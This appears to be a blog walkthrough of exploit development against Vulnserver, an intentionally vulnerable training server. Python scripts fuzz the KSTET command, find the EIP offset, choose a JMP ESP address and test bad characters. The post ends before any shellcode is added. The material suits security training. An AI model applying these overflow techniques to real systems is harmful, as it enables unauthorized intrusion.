---
layout: post
title: Vulnserver
---

<p class="message">
  Vulnserver is an intentionally vulnerable Windows based TCP server. It is commonly used to practice exploitation techniques like what I have done with it. 
  In this walk-through I have spun vulnserver up on a Windows 10 VM and will exploit it using a buffer overflow vulnerability within one of it's commands.
  I will be using the immunity debugger and pythons mona modules in order to exploit this application.
  <br>
  Everything I used in this walkthrough I leaned from the Pratical Ethical Hacking course <a href="">on Udemy</a> by Heath Adams.
</p>

Just like with any other pentest I start by scanning the target with nmap.

<img src="">
<img src="">

Port 9999 is the port vulnserver is running on and the one I am interested in.\
Using netcat I connect to the server.

<img src="">

In order to find a command vulnerable to buffer overflows I started by spiking the commands 

<p class="message">s_readline();<br>s_string("KSTET ");<br>s_string_variable("0");</p>

While spiking, I have the vulnserver application attached to immunity debugger. When running the KSTET spike the server crashes and observing immunity debugger 
shows me that the ESP and EIP are both overwritten with A's. Exactly what I'm looking for.

<img src="">

From immunity debugger I also see that the KSTET command adds special characters to the beggining of the input data. Specifically "/.:/". When writing scripts 
later I will need to remeber to append this to the beggining of my commands.\
Now that I have a vulnerable command to concentrate on I need to find the exact bytes at which the input data overwrites the EIP so I can overwrite it.\
To begin I'll use a fuzzing script to find a general byte size that crashed the program.

```
#!/usr/bin/python

import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('172.16.31.171',9999))
                
        print("Fuzzing KSTET feild with %s bytes" % len(buffer))
        s.recv(1024)
        s.send(('KSTET /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100

    except:
        print "Fuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()
 ```
 
 <img src="">
 
 The script crashes the program at 200 bytes and observing immunity debugger shows me that the EIP is indeed overwritten.\
 This tells me that somewhere in those 200 bytes the EIP is being overwritten but does not tell me at exactly which bytes this is occuring. For that I use the pattern_create ruby module included in the metasploit-famework tools.\
Using 200 as a parameter (becuase that how long we need it to be to trigger the crash) the module generates a string for me to use to crash the application. 
 
 <img src="">
 
 Now I update my script from earlier and send the new command.
 
 ```
 #!/usr/bin/python

import sys, socket
from time import sleep
                                                                                                                    
offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"                     
                                                                                                                    
try:                                                                                                                
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)                                                              
    s.connect(('172.16.31.171',9999))                                                                               
                                                                                                                    
    s.send(('KSTET /.:/' + offset))                                                                                 
    s.close()                                                                                                       
                                                                                                                    
except:                                                                                                             
    print "Fuzzing crashed at %s bytes" % str(len(buffer))                                                          
    sys.exit() 
```

<img src="">

The program crashes and the EIP is overwritten with 41326341.\
This alone doesn't tell me much but using the the pattern_offset ruby module will show me the exact byte at which the EIP was overwritten.\
I pass the length of the of the command and the value of the EIP to the module.

<img src="">

Exact match at 66 bytes!\
This is great but it is always a good idea to verify information so modifying my script from before I'll send 66 bytes of A's and 4 bytes of B's. If the EIP is overwritten with just 42's then I know we have the correct offset.

```
#!/bin/python

import sys, socket
from time import sleep

shellcode = "A" * 66 + "B" * 4

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('172.16.31.171',9999))

    s.send(('KSTET /.:/' + shellcode))
    s.close()

except:
    sys.exit()
```

<img src="">

What do you know, the EIP is overwritten with 42's. Looks like I have the correct offset.\
Now that I have control of the EIP I need a spot in memory to have the instruction pointer point to where I can execute my payload.
To find such a specific spot I'll use mona modules with immunity debugger.

<img src="">

Looking at the list of modules available in the application I want to find one with very little memory protections so my payload can overwrite it. 
The very first module listed seems to fit the bill, Falses's across the board.\
Now that I know essfunc.dll has no memory protections I need to find its jmp code in order to point the EIP to this module.\
Luckily for me mona can help me with that too. Using mona find to look for the jmp code string \xff\xe4 in the module essfunc.dll

<img src="">

Choosing the first one, 625011af I now have a jmp code for the vulnerable module.\
You might think that's all I need to now exploit the service however I still need to search for bad characters. Bad characters are characters that may have been assigned special meaning in a program and therefore cannot be used in my shell code as they have a specific meaning to the processor.\
Using this script I send all possible bad characters at the application and examine the hex dump in immunity debugger. Any oddities in the dump will signify that character as being a bad character becuase it produced something other then the character it should be. 

```
#!/bin/python

import sys, socket
from time import sleep

badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
badchars += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
badchars += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
badchars += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
badchars += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
badchars += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
badchars += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

shellcode = "A" * 66 + "B" * 4 + badchars

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('172.16.31.171',9999))

    s.send(('KSTET /.:/' + shellcode))
    s.close()

except:
    sys.exit()
```

This application fortunatly has no bad characters other then the null character \\x00

<!-- Bad Characters -->
